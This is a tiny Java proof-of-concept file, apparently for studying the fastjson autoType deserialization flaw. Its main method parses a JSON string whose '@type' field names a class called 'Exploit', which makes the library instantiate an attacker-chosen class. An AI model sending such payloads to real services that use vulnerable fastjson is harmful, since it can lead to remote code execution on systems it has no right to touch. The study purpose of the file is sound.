import com.alibaba.fastjson.JSON;

/**
 * @author <a href="http://blog.chenforcode.cn">PKUCoder</a>
 * @date 2022/3/19 5:22 下午
 * @description
 */
public class Poc {
    public static void main(String[] args) {
        JSON.parseObject("{\"@type\":\"Exploit\", \"name\":\"test\"}");
    }
}
